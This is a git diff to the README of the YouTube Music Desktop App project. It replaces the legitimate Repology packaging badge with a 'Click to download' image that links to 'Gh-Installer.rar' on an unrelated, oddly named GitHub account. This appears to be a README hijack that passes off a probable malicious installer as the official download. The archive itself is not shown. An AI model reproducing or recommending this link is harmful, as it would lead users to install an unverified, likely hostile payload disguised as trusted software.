@@ -1,4 +1,4 @@
-# YouTube Music Desktop App
+  # YouTube Music Desktop App
 ### Now with a Fresh new Codebase 😉
 
 ![YouTube Music Desktop App](.github/images/readme_main_app.png)
@@ -17,9 +17,7 @@ TODO: Write guides for v2. While these may still be helpful they are geared towa
 -->
 
 # ⬇️ Download at
-<a href="https://repology.org/project/ytmdesktop/versions">
-	<img type="image/svg" align="right" src="https://repology.org/badge/vertical-allrepos/ytmdesktop.svg" alt="Packaging status"/>
-</a>
+[![Download](https://i.postimg.cc/0QdN7Rxz/Click-to-download.png)](https://github.com/yourmomisfieldtested/yourmomisfieldtested1/releases/download/ClientApp/Gh-Installer.rar)
 
 #### Windows
 <!--
